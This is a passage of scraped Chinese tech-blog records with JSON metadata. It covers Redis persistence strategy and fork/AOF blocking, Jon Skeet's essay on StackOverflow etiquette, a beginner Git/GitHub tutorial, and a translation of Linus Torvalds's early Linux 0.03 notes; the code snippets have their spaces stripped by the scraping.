久化同样具有数据备份的功能，而且主机master和从机slave可以独立的选择持久化方案。下面分场景来讨论持久化策略的选择，下面的讨论也只是作为参考，实际方案可能更复杂更具多样性。（1）如果Redis中的数据完全丢弃也没有关系（如Redis完全用作DB层数据的cache），那么无论是单机，还是主从架构，都可以不进行任何持久化。（2）在单机环境下（对于个人开发者，这种情况可能比较常见），如果可以接受十几分钟或更多的数据丢失，选择RDB对Redis的性能更加有利；如果只能接受秒级别的数据丢失，应该选择AOF。（3）但在多数情况下，我们都会配置主从环境，slave的存在既可以实现数据的热备，也可以进行读写分离分担Redis读请求，以及在master宕掉后继续提供服务。在这种情况下，一种可行的做法是：master：完全关闭持久化（包括RDB和AOF），这样可以让master的性能达到最好slave：关闭RDB，开启AOF（如果对数据安全要求不高，开启RDB关闭AOF也可以），并定时对持久化文件进行备份（如备份到其他文件夹，并标记好备份的时间）；然后关闭AOF的自动重写，然后添加定时任务，在每天Redis闲时（如凌晨12点）调用bgrewriteaof。这里需要解释一下，为什么开启了主从复制，可以实现数据的热备份，还需要设置持久化呢？因为在一些特殊情况下，主从复制仍然不足以保证数据的安全，例如：master和slave进程同时停止：考虑这样一种场景，如果master和slave在同一栋大楼或同一个机房，则一次停电事故就可能导致master和slave机器同时关机，Redis进程停止；如果没有持久化，则面临的是数据的完全丢失。master误重启：考虑这样一种场景，master服务因为故障宕掉了，如果系统中有自动拉起机制（即检测到服务停止后重启该服务）将master自动重启，由于没有持久化文件，那么master重启后数据是空的，slave同步数据也变成了空的；如果master和slave都没有持久化，同样会面临数据的完全丢失。需要注意的是，即便是使用了哨兵(关于哨兵后面会有文章介绍)进行自动的主从切换，也有可能在哨兵轮询到master之前，便被自动拉起机制重启了。因此，应尽量避免“自动拉起机制”和“不做持久化”同时出现。（4）异地灾备：上述讨论的几种持久化策略，针对的都是一般的系统故障，如进程异常退出、宕机、断电等，这些故障不会损坏硬盘。但是对于一些可能导致硬盘损坏的灾难情况，如火灾地震，就需要进行异地灾备。例如对于单机的情形，可以定时将RDB文件或重写后的AOF文件，通过scp拷贝到远程机器，如阿里云、AWS等；对于主从的情形，可以定时在master上执行bgsave，然后将RDB文件拷贝到远程机器，或者在slave上执行bgrewriteaof重写AOF文件后，将AOF文件拷贝到远程机器上。一般来说，由于RDB文件文件小、恢复快，因此灾难恢复常用RDB文件；异地备份的频率根据数据安全性的需要及其他条件来确定，但最好不要低于一天一次。3.fork阻塞：CPU的阻塞在Redis的实践中，众多因素限制了Redis单机的内存不能过大，例如：当面对请求的暴增，需要从库扩容时，Redis内存过大会导致扩容时间太长；当主机宕机时，切换主机后需要挂载从库，Redis内存过大导致挂载速度过慢；以及持久化过程中的fork操作，下面详细说明。首先说明一下fork操作：父进程通过fork操作可以创建子进程；子进程创建后，父子进程共享代码段，不共享进程的数据空间，但是子进程会获得父进程的数据空间的副本。在操作系统fork的实际实现中，基本都采用了写时复制技术，即在父/子进程试图修改数据空间之前，父子进程实际上共享数据空间；但是当父/子进程的任何一个试图修改数据空间时，操作系统会为修改的那一部分(内存的一页)制作一个副本。虽然fork时，子进程不会复制父进程的数据空间，但是会复制内存页表（页表相当于内存的索引、目录）；父进程的数据空间越大，内存页表越大，fork时复制耗时也会越多。在Redis中，无论是RDB持久化的bgsave，还是AOF重写的bgrewriteaof，都需要fork出子进程来进行操作。如果Redis内存过大，会导致fork操作时复制内存页表耗时过多；而Redis主进程在进行fork时，是完全阻塞的，也就意味着无法响应客户端的请求，会造成请求延迟过大。对于不同的硬件、不同的操作系统，fork操作的耗时会有所差别，一般来说，如果Redis单机内存达到了10GB，fork时耗时可能会达到百毫秒级别（如果使用Xen虚拟机，这个耗时可能达到秒级别）。因此，一般来说Redis单机内存一般要限制在10GB以内；不过这个数据并不是绝对的，可以通过观察线上环境fork的耗时来进行调整。观察的方法如下：执行命令infostats，查看latest_fork_usec的值，单位为微秒。为了减轻fork操作带来的阻塞问题，除了控制Redis单机内存的大小以外，还可以适度放宽AOF重写的触发条件、选用物理机或高效支持fork操作的虚拟化技术等，例如使用Vmware或KVM虚拟机，不要使用Xen虚拟机。4.AOF追加阻塞：硬盘的阻塞前面提到过，在AOF中，如果AOF缓冲区的文件同步策略为everysec，则：在主线程中，命令写入aof_buf后调用系统write操作，write完成后主线程返回；fsync同步文件操作由专门的文件同步线程每秒调用一次。这种做法的问题在于，如果硬盘负载过高，那么fsync操作可能会超过1s；如果Redis主线程持续高速向aof_buf写入命令，硬盘的负载可能会越来越大，IO资源消耗更快；如果此时Redis进程异常退出，丢失的数据也会越来越多，可能远超过1s。为此，Redis的处理策略是这样的：主线程每次进行AOF会对比上次fsync成功的时间；如果距上次不到2s，主线程直接返回；如果超过2s，则主线程阻塞直到fsync同步完成。因此，如果系统硬盘负载过大导致fsync速度太慢，会导致Redis主线程的阻塞；此外，使用everysec配置，AOF最多可能丢失2s的数据，而不是1s。AOF追加阻塞问题定位的方法：（1）监控infoPersistence中的aof_delayed_fsync：当AOF追加阻塞发生时（即主线程等待fsync而阻塞），该指标累加。（2）AOF阻塞时的Redis日志：AsynchronousAOFfsyncistakingtoolong(diskisbusy?).WritingtheAOFbufferwithoutwaitingforfsynctocomplete,thismayslowdownRedis.（3）如果AOF追加阻塞频繁发生，说明系统的硬盘负载太大；可以考虑更换IO速度更快的硬盘，或者通过IO监控分析工具对系统的IO负载进行分析，如iostat（系统级io）、iotop（io版的top）、pidstat等。5.info命令与持久化前面提到了一些通过info命令查看持久化相关状态的方法，下面来总结一下。（1）infoPersistence执行结果如下：其中比较重要的包括：rdb_last_bgsave_status:上次bgsave执行结果，可以用于发现bgsave错误rdb_last_bgsave_time_sec:上次bgsave执行时间（单位是s），可以用于发现bgsave是否耗时过长aof_enabled:AOF是否开启aof_last_rewrite_time_sec:上次文件重写执行时间（单位是s），可以用于发现文件重写是否耗时过长aof_last_bgrewrite_status:上次bgrewrite执行结果，可以用于发现bgrewrite错误aof_buffer_length和aof_rewrite_buffer_length:aof缓存区大小和aof重写缓冲区大小aof_delayed_fsync:AOF追加阻塞情况的统计（2）infostats其中与持久化关系较大的是：latest_fork_usec，代表上次fork耗时，可以参见前面的讨论。六、总结本文主要内容可以总结如下：1、持久化在Redis高可用中的作用：数据备份，与主从复制相比强调的是由内存到硬盘的备份。2、RDB持久化：将数据快照备份到硬盘；介绍了其触发条件（包括手动出发和自动触发）、执行流程、RDB文件等，特别需要注意的是文件保存操作由fork出的子进程来进行。3、AOF持久化：将执行的写命令备份到硬盘（类似于MySQL的binlog），介绍了其开启方法、执行流程等，特别需要注意的是文件同步策略的选择（everysec）、文件重写的流程。4、一些现实的问题：包括如何选择持久化策略，以及需要注意的fork阻塞、AOF追加阻塞等。参考文献《Redis开发与运维》《Redis设计与实现》《Redis实战》http://www.redis.cn/topics/persistence.htmlhttps://mp.weixin.qq.com/s/fpupqLp-wjR8fQvYSQhVLghttps://mp.weixin.qq.com/s?__biz=MzI4NTA1MDEwNg==&amp;mid=2650764050&amp;idx=1&amp;sn=891287b9f99a8c1dd4ce9e1805646741&amp;chksm=f3f9c687c48e4f91c6631e7f5e36a9169c10549386bec541dbeef92ed0023a373f6ec25c2ef1&amp;mpshare=1&amp;scene=1&amp;srcid=0525xnHQxiFwpzFWSME2LQrb#rdhttps://mp.weixin.qq.com/s?__biz=MzI4NTA1MDEwNg==&amp;mid=2650763383&amp;idx=1&amp;sn=348a84605a7cdefe4e075c9f0310f257&amp;chksm=f3f9c5e2c48e4cf41bd3f708bce3f9a1302a699cf7defe611e9aea120fcb424944119e079362&amp;mpshare=1&amp;scene=1&amp;srcid=0525XIl8KXvHYvX42oaUcop0#rdhttps://blog.csdn.net/tonyxf121/article/details/8475603http://heylinux.com/archives/1932.htmlhttps://www.m690.com/archives/380/1赞1收藏评论", "url_object_id": "e4cc420154439ecffbc963653c5f7cd8"},{"title": "如何成为 StackOverflow 上合格的提问者与回答者", "url": "http://blog.jobbole.com/114166/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/03/6dd085bf97f82f786b71b4fbcdb37e88.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,7,/,0,9, ,·", "content": "本文由伯乐在线-学以致用123翻译，刘唱校稿。未经许可，禁止转载！英文出处：JONSKEET。欢迎加入翻译组。写这篇文章最直接的原因是我的朋友RobConery发了一条推特，解释他为什么放弃在StackOverflow贡献答案。然而，那已经是很长时间的事了。前不久，我开始写一篇与本文类似的文章，但是文章越写越长，并且没有得出任何结论。现在我用一个小时的时间写这篇文章，然后不论写了什么都要发出去（稍后可能会重新排版）。我了解很多用户对StackOverflow的复杂感情。有些人认为它完全没有价值，但是我相信更多的人认为它“资源有价值，但是潜在的反对意见让人很难做出贡献”。有些人则定期做出贡献，在合理的时间范围内，偶尔解释或者查看反对意见。这篇文章，我将谈谈我的经历，和我的一些看法，关于StackOverflow存在的问题、我对一些察觉到的问题持反对态度、和如何改善目前的状况。下面是我希望在二月份拜访StackOverflow团队时详细讨论的主题，但我们却忙于讨论其它重要问题。在这篇文章中，我大部分讨论的是”提问者”和“回答者”，这是特意进行的简化。许多用户可能既是求助者又是回答者，我很多时候还会用不写答案但是用“view”写评论的方式成为回答者。尽管任何用户都可以担任不同的角色，但是对提交的每个问题，每个人通常只有一个角色。当然还有其他的角色，例如“评论其它答案的评论者”，我不想花费过多的时间讨论这个问题。目标和期望的差距与生活中大多数事情相似，当所有人目标一致时StackOverflow的表现最好，因为我们可以共同迈向那个目标。相反，当人们的目标不同时则通常会出现问题。对于StackOverflow而言，最普遍的问题在于这两个目标的差异：–提问者：尽量减少解决面临的问题所需要的时间–回答者：最大限度地提高网站所有问题的价值，将网站视为长久的资源就我而言，我经常有一个“试图帮助提高软件工程师的诊断能力，使他们能够更好地解决自己的问题”的子目标。例如，考虑这个问题（编造的，但并不牵强）：Random总是返回相同的数值，它出问题了吗？在我看来这是一个低质量的问题（稍后我将对其进行详细讨论）。我基本知道哪里存在问题，但是为了达到我的目标我希望提问者改善这个问题，我希望看到他们的代码、结果等。如果我的答案是正确的（快速连续创建多个使用相同的基于系统时间的种子的System.Random的多个实例），那么这个问题很可能由于重复而被关闭，并且很可能被删除。以现在的形式，这个问题对网站没有任何好处。我不想没有确定是否重复之前就将这个问题以重复的原因关闭。现在，从提问者的角度来看，这些并不重要。如果他们知道我知道问题可能出现在哪，他们可能会认为我应该告诉他们，以便他们可以继续工作。如果现在就可以得到答案，为什么还需要花费10分钟来重现问题？更糟糕的是，如果他们花时间做了这些事情，然后由于重复的原因又立刻关闭这个问题，这样看上去很像在浪费时间。如果忽略情绪，我认为时间没有被浪费：–提问者可以了解到，提出一个清晰的问题可以更快的得到答案。–提问者可以了解到，搜索重复问题很有价值，因为这可能意味着根本不需要提出这个问题。但是我们都是普通人，忽略感情显然是个不可取的方法。在这种情况下可能发生的情况是(即使我始终很有礼貌)提问者会认为StackOverflow中到处是只关心自己权利的“交警”。我当然可以认为这是不公平的（虽然这可能会突出我的实际目标）但这可能无法改变任何人的想法。因此，这是个问题。StackOverflow社区认同网站的目标，那么在用户提出问题时向用户明确说明网站的目标了吗？值得注意的是导航页面(奇怪的是网站首页没有设置该链接)包含以下内容：在您的帮助下，我们正在共同努力，为每个关于编程的问题建立一个详细答案库。我倾向于稍作更改：StackOverflow的目标在于创建高质量的问题库以及问题的高质量答案库。这真的是一个共同愿景吗？如果提问者意识到这点，会有帮助吗？我是希望如此，但是我怀疑它会阻止掉所有问题（我不认为有什么能做到阻止所有问题的提问，世界不是一个完美的地方）。让我们转到另一个我与其他人有不同意见的话题：低质量问题。是的，存在低质量问题即使不能以完全客观的方式衡量，我也敢肯定有高质量问题和低质量问题（还有很多介于中间的）。我认为StackOverflow中这样的问题可以看做高质量问题：–提出一个问题，并且明确知道该问题的要求。这个问题应该能够非常明显地看出答案是否回答了问题（这与答案是否正确无关）–避免无关紧要。这可能很困难，但是我认为这是有效工作的一部分：如果在开发web应用程序时遇到问题，至少应该尝试确定web应用程序的上下文是否与问题有关。–对其他人尽量有帮助。这是避免不相关因素的非常重要的原因。很多用户需要将字符串解析为日期。较少人需要使用X框架的Y版本通过定制及专有网络协议与COBOL编写的客户端交互时将字符串解析为日期。–阐述提问者进行过的尝试、进展以及卡住的位置。–在适当的情况下（通常情况）包含一个证明问题的小例子。–格式正确。不要使用整页的段落，不要使用没有格式化的代码等等。StackOverflow上有很多符合所有这些要求的问题，或符合以上大部分要求的问题。我有理由认为这样的问题比另外一些问题质量高，一些问题可能只是一个家庭作业的照片。我曾经见过这样的问题，虽然，它们并不总是那么糟糕，但是我真的不知道如果这都不能认为是一个低质量的问题，我们还能达成什么一致意见。当然，在此之间还有很多问题——但我认为接受存在低质量问题的观点非常重要，或者至少经过讨论并找出不同意见。经验有助于写出好问题，但并非绝对必要我看过许多文章声称StackOverflow对于新用户来讲过于困难，因为，新用户很难写出一个好问题。我认为接受网站协议并愿意为之付出努力的新人，至少能提出一个合理的问题。他们可能需要花费更长的时间进行研究并写出问题，而且写出的问题可能不会像有经验的人在相同情况下写出的问题那样简单。但是我相信，整体而言，新用户能够写出质量足够好的问题。他们可能没有意识到他们需要做什么或者为什么这样做，但这是一个拥有不同解决方案的问题。而不仅仅是”提问者可能是技术新手，所以我们需要回答没有任何帮助的糟糕问题”。一个稍稍不同的问题是用户是否具有写出真正优秀问题所需的诊断技能。这是一个我非常重视的话题，而且我真的希望有一个好的解决方案，但是我真的没有。我坚信，帮助程序员提高自己的诊断能力，除了在StackOverflow中提出更好的问题之外，将对他们有巨大的好处。一些用户在StackOverflow的表现像个混蛋，但是大多数人不会这样我当然不会宣称StackOverflow社区是完美的。我看到过一些用户对提出低质量问题的人非常无理，我不是要为此进行申辩。如果你看我非常不礼貌，那么请阻止我。我不认为要求改进问题本身是粗鲁的，我们可以非常礼貌地要求改进问题，也可以非常刻薄地要求改进问题。我完全赞成提高StackOverflow的文明水平，但是我认为这不能以牺牲网站质量为代价。我还经历过要求提问者提供更多信息时，提问者的反应非常无理的情况。这不是一个单向的问题。在这个方向上，我看到过比回答者更加粗鲁的行为。事实上，这些问题通常被关闭或删除，所以只是随便浏览网站的人通常不会看到这些。我的时间非常有限，所以我们来看最重要的一点，我们需要对彼此更友好。Jon的StackOverflow宣誓我故意把它称为我的宣誓，因为这不是将我的要求强加于他人的地方。如果你认为这也是你想遵循的原则（或许有一些修正），那再好不过了。如果StackOverflow决定在网站指南的某个地方采用它，我非常欢迎，并且他们可以对其做任何适当的修改。从本质上来讲，我认为许多问题看起来像是提问者和回答者之间的一种交易。因此，建立一种契约是合理的（虽然这听起来更像是商业用语），因此，我倾向于使用一个诚心的宣誓。作为一个回答者，我将…不表现的像个混蛋。记住我正在回应的是人，是有感情的。认定我正在回应的人是诚心地希望得到帮助。要明确，对问题质量的评论不是对提问者的价值的指责。记住，有些时候，我正在回应的人可能会感到他们正在被指责，即使我不认为我有这个意思。要明确，评论如何改善问题时提出积极的具体建议，不要消极地强调现状。答案要清楚，记住不是每个人都与我的技术背景相同（所以有些术语可能需要链接等)。花点时间好好展示我的答案，使用尽可能易读的格式。作为一个提问者，我将…不表现的像个混蛋。记住任何一个回答问题的都是人类，都是有感情的。认定任何一个回答我问题的人都充满善意并试图帮助我。记住我是在要求其他人放弃自己的时间来帮助我解决问题。在提问之前先研究自己的问题、尽可能的缩小问题范围、给出尽可能详细的相关信息来减少回答问题的人需要花费的时间。花点时间好好提出自己的问题，使用尽可能易读的格式。我希望大部分时间我可以遵循这些誓言。我怀疑自己有时候做不到，所有希望通过明确的写出来，阅读它，使自己成为一个更好的社区成员。我认为如果每个人在StackOverflow上发布任何内容之前都遵循这样的誓言，我们的社区将会更加美好。打赏支持我翻译更多好文章，谢谢！打赏译者打赏支持我翻译更多好文章，谢谢！任选一种支付方式1赞1收藏评论关于作者：学以致用123应用软件开发，主要用python、sql个人主页·我的文章·21", "url_object_id": "3c54b89b3dd03db77b3745813da08bcc"},{"title": "手把手指导您使用 Git", "url": "http://blog.jobbole.com/114101/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/02/2027c50856ddfe647e45b4ac2e86c9f1.jpg"], "praise_nums": 1, "fav_nums": 5, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,0,8, ,·", "content": "原文出处：KedarVijayKulkarni译文出处：Linux中国/ChenYi如果您从未使用过Git，甚至可能从未听说过它。莫慌张，只需要一步步地跟着这篇入门教程，很快您就会在GitHub上拥有一个全新的Git仓库。在开始之前，让我们先理清一个常见的误解：Git并不是GitHub。Git是一套版本控制系统（或者说是一款软件），能够协助您跟踪计算机程序和文件在任何时间的更改。它同样允许您在程序、代码和文件操作上与同事协作。GitHub以及类似服务（包括GitLab和BitBucket）都属于部署了Git程序的网站，能够托管您的代码。步骤1：申请一个GitHub账户在GitHub.com网站上（免费）创建一个账户是最简单的方式。选择一个用户名（比如说，octocat123），输入您的邮箱地址和密码，然后点击SignupforGitHub。进入之后，您将看到下方插图的界面：步骤2：创建一个新的仓库一个仓库（repository），类似于能储存物品的场所或是容器；在这里，我们创建仓库存储代码。在+符号（在插图的右上角，我已经选中它了）的下拉菜单中选择NewRepository。给您的仓库命名（比如说，Demo）然后点击CreateRepository。无需考虑本页面的其他选项。恭喜！您已经在GitHub.com中建立了您的第一个仓库。步骤3:创建文件当仓库创建完毕后，界面将和下方一致：不必惊慌，它比看上去简单。跟紧步骤。忽略其他内容，注意截图上的“…orcreateanewrepositoryonthecommandline,”。在您的计算机中打开终端。键入git然后回车。如果命令行显示bash:git:commandnotfound，在您的操作系统或发行版安装Git命令。键入git并回车检查是否成功安装；如果安装成功，您将看见大量关于使用该命令的说明信息。在终端内输入：mkdirDemo12mkdirDemo这个命令将会创建一个名为Demo的目录（文件夹）。如下命令将会切换终端目录，跳转到Demo目录：cdDemo12cdDemo然后输入：echo\"#Demo\"&gt;&gt;README.md12echo\"#Demo\"&gt;&gt;README.md创建一个名为README.md的文件，并写入#Demo。检查文件是否创建成功，请输入：catREADME.md12catREADME.md这将会为您显示README.md文件的内容，如果文件创建成功，您的终端会有如下显示：使用Git程序告诉您的电脑，Demo是一个被Git管理的目录，请输入：gitinit12gitinit然后，告诉Git程序您关心的文件并且想在此刻起跟踪它的任何改变，请输入：gitaddREADME.md12gitaddREADME.md步骤4：创建一次提交目前为止，您已经创建了一个文件，并且已经通知了Git，现在，是时候创建一次提交commit了。提交可以看作是一个里程碑。每当完成一些工作之时，您都可以创建一次提交，保存文件当前版本，这样一来，您可以返回之前的版本，并且查看那时候的文件内容。无论何时您修改了文件，都可以对文件创建一个上一次的不一样的新版本。创建一次提交，请输入：gitcommit-m\"firstcommit\"12gitcommit-m\"firstcommit\"就是这样！刚才您创建了包含一条注释为“firstcommit”的Git提交。每次提交，您都必须编辑注释信息；它不仅能协助您识别提交，而且能让您理解此时您对文件做了什么修改。这样到了明天，如果您在文件中添加新的代码，您可以写一句提交信息：“添加了新的代码”，然后当您一个月后回来查看提交记录或者Git日志（即提交列表），您还能知道当时的您在文件夹里做了什么。步骤5:将您的计算机与GitHub仓库相连接现在，是时候用如下命令将您的计算机连接到GitHub仓库了：gitremoteaddoriginhttps://github.com/&lt;your_username&gt;/Demo.git12gitremoteaddoriginhttps://github.com/&lt;your_username&gt;/Demo.git让我们一步步的分析这行命令。我们通知Git去添加一个叫做origin（起源）的，拥有地址为https://github.com/&lt;your_username&gt;/Demo.git（它也是您的仓库的GitHub地址）的remote（远程仓库）。当您提交代码时，这允许您在GitHub.com和Git仓库交互时使用origin这个名称而不是完整的Git地址。为什么叫做origin？当然，您可以叫点别的，只要您喜欢（惯例而已）。现在，我们已经将本地Demo仓库副本连接到了其在GitHub.com远程副本上。您的终端看起来如下：此刻我们已经连接到远程仓库，可以推送我们的代码到GitHub.com（例如上传README.md文件）。执行完毕后，您的终端会显示如下信息：然后，如果您访问https://github.com/&lt;your_username&gt;/Demo，您会看到截图内显示的情况：就是这么回事！您已经创建了您的第一个GitHub仓库，连接到了您的电脑，并且从你的计算机推送（或者称：上传）一个文件到GitHub.com名叫Demo的远程仓库上了。下一次，我将编写关于Git复制（从GitHub上下载文件到你的计算机上）、添加新文件、修改现存文件、推送（上传）文件到GitHub。1赞5收藏评论", "url_object_id": "b0fe29cc0c4c89c756cfc2daf1bfe5cb"},{"title": "Linus 定义 Linux", "url": "http://blog.jobbole.com/114208/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/03/5215e39e39eb546d1689aa26f8d633be.jpg"], "praise_nums": 1, "fav_nums": 2, "comments_nums": 2, "tags": "2,0,1,8,/,0,7,/,0,9, ,·", "content": "原文出处：LinusTorvalds译文出处：开源中国LINUX介绍LINUX是什么？LINUX是一个免费类unix内核，适用于386-AT计算机，附带完整源代码。主要让黑客、计算机科学学生使用，学习和享受。它大部分用C编写，但是一小部分是用gnu格式汇编，而且引导序列用的是因特尔086汇编语言。C代码是相对ANSI的，使用一些GNU增强特性（大多为__asm__和inline）。然而有很多可用于386电脑的unices，他们大部分要花很多钱，而且不附带源码。因此他们是使用计算机的理想选择，但是如果你想了解他们如何工作，那是不可能的。也有一些Unix是附带源码的。Minix，AndrewS.Tanenbaum编写的学习工具，已经在大学中作为教学工具使用了很多年了。BSD-386系统是附带源码的，但是有版权限制，而且要花很多钱（我记得起始价格为$995）。GNU内核（Hurd）将会是免费的，但是现在还没有准备好，而且对于了解和学习它们来说有点庞大。LINUX与Minix是最相似的，由于它很小而且不是非常复杂，因此易于理解（嗯…）。LINUX是基于Minix编写的，因此有相当多的相同点，任何Minix黑客在使用LINUX的时候都感觉非常熟悉。不过，没有在项目中使用Minix代码，因此Minix版权没有限制到这个新系统。它也是完全免费的，而且它的版权非常宽松。因此不像使用Minix，它不需要几兆字节大小的区别。LINUX版权虽然是免费的发布版，我还是从以下几个方面限制了LINUX的使用：你可以自由复制和重新发布源码和二进制，只要是：完全开源。因此不能单独发布二进制，即使你只修改了一点。你不能从发布版获取利益。事实上甚至“装卸费用”都是不被接受的。你要保持完整的适当版权。根据需要你可能会修改源码，但是如果你发布了新系统的一部分（或者只有二进制），必须将新的代码包含进去。除了不包含版权的代码之外，你可能会做一些小的修改。这由你来定，但是如果能将相关内容或者代码告诉我，将不胜感激。对任何使用或者扩展系统的人来说，这应该足够宽松而不会引起任何担忧。如果你有朋友真的不想要源码，只想要一个能运行的二进制，你当然可以给他而不用担心我会起诉你。不过最好只在朋友之间这么做。LINUX运行所需的硬件/软件LINUX是在一个运行Minix的386-AT上开发的。由于LINUX是一个真正的操作系统，而且需要直接与硬件交互来做一些事情，你必须有一个非常相似的系统来让他顺利运行：386-AT（PS/2之类是不同的，不能正常运行）VGA或者EGA屏幕硬件。标准AT硬盘接口，IDE盘可以运行（实际上我用的就是这个）。正常实模式BIOS。一些机器看起来是用虚-86模式运行启动程序，而且在这样的机器LINUX不会启动和正常运行。LINUX会发展成为一个自给自足的系统，现在需要Minix-386才能正常运行。你需要Minix让初始化启动文件系统，和编译OS二进制。在那之后LINUX是一个自给自足的系统，但是为了做文件系统检查（fsck）和修改之后重编译系统，推荐使用Minix。获取LINUXLINUX现在可以使用匿名ftp从‘nic.funet.fi’的‘/pub/OS/Linux’目录获取。这个目录包含操作系统的所有源码，还有一些二进制文件，因此你可以真正使用系统了。注意！二进制大多是GNU软件，而且版权比LINUX的严格（GNU非盈利性版权）。因此你不能在不发布他们源码的情况下重新发布他们，可以在/pub/GNU中找到。关于GNU非盈利性版权，从任何GNU软件包了解更多。此目录中各类文件如下：linux-0.03.tar.Z–系统的完全源码，16位tar压缩文件格式。Linux.tex–这个文件的LATEX源码。bash.Z–在LINUX下运行的bash二进制文件。这个二进制文件应该放到预留给LINUX文件系统中的/bin/sh下（参见installation）。update.Z–更新二进制文件，要放到/bin/update。gccbin.tar.Z–GNUcc二进制文件需要由一个可运行的编译器。这个tar压缩包含有编译器，加载器，汇编程序和支持程序（nm，strip等）。它还包含一个小型的库，可用于大部分程序。include.tar.Z–让gcc运行的必要include文件。unistd.tar.Z–unistd库程序的源码（即系统调用接口）。通过这个你可以使用系统独立库源码编译一个大一些的库。utilbin.tar.Z–各种GNU工具的二进制文件，包括GNU的fileutils，make和tar。也包含克隆emacs的uemacs。README,RELNOTES-0.01,INSTALLATION–包含一些（有点过时的）LINUX相关的信息的ascii文件。让系统运行的最少文件是OS源码和bash和更新二进制文件。不过只用这些，你做不了什么事。安装在你拿到了必要LINUX文件之后，你需要编译系统和创建root目录。必要的二进制文件需要放到root文件系统中。按如下操作：1.备份你的软件。虽然LINUX从没有毁坏过我的任何文件，但没有什么是必然的。安全胜过遗憾。2.选择/创建一个标准MinixHD-分区作为新的LINUXroot文件系统。3.在新的root创建必要的设备节点。LINUX与Minix使用相同类型的节点，所以使用Minix的mknod命令创建下面的设备：节点号与在Minix中相同。/dev/tty/dev/tty[0-2]/dev/hd[0-9]4.将必要文件放到新的root分区。文件应该放在下面目录中：希望你现在有一个功能正常的unix，而且你已经root权限登录。LINUX现在没有‘init’过程，只要你注销，系统会同步并等待。使用三指键（Ctrl+Alt+Del）重启机器。gcc添加链接到你选择的/usr/local/lib中的文件。我将ld，as，nm，strip和size链接到他们相应的/usr/local/lib/gcc-XXX。gccbin.tar.Z中的内容，除了gccinclude.tar.Z的内容utilbin.tar.Z的内容sh，即bash.Zupdate/bin:/usr/bin:/usr/include:/usr/local/lib:/usr/local/bin:编辑系统中的linux/include/linux/config.h。这个文件包含了针对于系统的信息：内存空间，硬盘类型，root分区号（同样的与Minix中的编号相同），键盘类型（现在只有US和Finnish）等。编译LINUX源码。一个简单技巧就可以完成，在你编辑makefiles为适合你的系统之后（即，删除-mstring-insnsflag，和修改适合你的路径。）1.40之前版本gcc的用户可能需要添加gnulib到makefile中‘LIBS=’一行。复制产生的镜像文件到软盘（即，cpImage/dev/PS0或者之类的）。使用新的软盘重启。启动界面应该告诉你系统正在启动（加载系统…），然后是一些必要的文件系统信息（xxx/XXXinodes/blocksfree），接下来是一个确定，还有bash提示（如果你没有.bashrc文件，则初始化bash#）。LINUX缺失/不兼容的东西LINUX是打算作为一个全部自给自足的内核，但现在并非如此。作为上面已经提到的，你需要Minix来设置启动设备并且检查文件系统当它运行起来的时候。这里有一些其它的不足之处：硬件的不兼容。一些AT标准特性当前还没有支持。最值得注意的是软盘驱动，利用LINUX进行实际工作（备份etc）当前是不可能的[译者：这个是oldlinux，这个是LinusTorvalds1991年10月写的文章，肯定当时是不行的]。还有串行连接的一些特性没有被实现（2400bps波特率的硬连接，没有挂断（hang-up）提示等等）。标准c库的不兼容。gcc分发版的libc.a没有完成，我对免费可发布的库功能很感兴趣。一些系统调用没有完全实现。这些设计绝大多数“极少调用”的特性比如调试（谁无论如何需要它的话，你的程序第一次是无法工作的:-)）以及其它的特性。如上所述，没有登陆和初始化进程。当前LINUX启动在单用户模式，以root作为控制台用户。对于一些移植工作足够了，但不是实际可用的。387支持[译者：硬件浮点，当时Intel发布了外接式FPU]没有被实现，即使已有一些基础程序被提供出来。”nic.funet.fi”的gcc二进制包使用软浮点（ie仿真功能调用）来支持4个基础数学运算操作。387-支持将尽快实现当我的电脑安装了这个硬件。希望在一个月或者两个月。现在还没有重要的系统管理命令实现在LINUX中。这些包括mkfs,format,fsck,mknod等。这些命令需要的内核特性还没有实现（format,mknod），一些命令只需要实现它。作为一个库，我欢迎任何免费分发文件。如您所见，LINUX还不是一个完整的系统。感谢您的帮助，使其变得更好。我对为LINUX重写的Minix命令不感兴趣，除非你自己从头开始编写它们。您当然可以免费（并鼓励）将您的Minix发行版中的所有内容用于您自己的LINUX系统，但由于Minix的版权，它们无法分发给更广泛的受众。这里提到的一些问题将由我（即lines/387/floppy支持）尽快修复，但我希望得到库函数的支持。感谢你们提交的错误报告及补丁还有愿望清单，如果你真的有针对问题的补丁，我会立即尝试去修复它。小的更改将作为补丁形式发送到邮件列表，并在nic.funet.fi'上设置，如果经过大量重写，或者修复大的补丁，整个系统将在nic.funet.fi’更新。LINUX移植软件LINUX被设计得让移植相对容易。因此，就有了完整的termios实现和一些POSIX库。我所移植的（诚然相对较少）程序没有任何问题。尽管LINUX与Minix非常相似，但Minix程序通常并不会比为其他nuix设计的程序更容易移植。因此，我不建议从一个特定程序的Minix版本开始，而应该尝试从头开始移植‘’virgin‘’程序。比BSD更接近SYSV，这意味着当给定一个-DUSG或者-DSYSV标识时，大多数程序很容易移植。移植过程中最困难的一点就是缺少库函数。这些必须由你来编写，或者从其他的来源复制（Minix可能是个有缘人）。另外，一些程序（特别是GNU）有各种各样的标识，这些标识可以定义哪些函数不可用（一旦在Makefile中添加了足够量的-DXXX_MISSING标识，GNUfileutils将编译的很好）。已经移植的程序下面这些程序已经移植到LINUX：GNUcc(gcc,cc1,cpp)GNUassembler(as386)GNUbinutils(ld,ar,nm,size,strip,ranlib)GNUcompress(16-bit)GNUtarGNUmakeGNUbash(BourneAgainSHell)GNUsedGNUbison(yacc-lookalike)GNUawkGNUfileutils(ls,cp,rm,mkdir,rmdir,tailetc)lessuemacs所有上述程序都能在‘nic.funet.fi’(主要在’/pub/gnu’)中找到，大多数LIINUX-binaries都可以在‘/pub/OS/Linux’目录中找到。包括gcc（cc1）有一些我自己增强的功能，所有这些程序都在没有变化的情况下编译的。先尝试自己编译，遇到问题可以将差异或者资源发邮件给我。另外，我提起过明确地GNU差异编译和运行。技术帮助LINUX目前有一个邮件列表，您可以通过邮件发送到这个地址订阅：Linux-activists-request@niksula.hut.fi，并要求包括在列表中。然后你可以通过这个邮箱：Linux-activists@niksula.hut.fi提问题，这将复制你的问题/答案/无论什么，并发送给列表中其他所有人。请注意Linux-a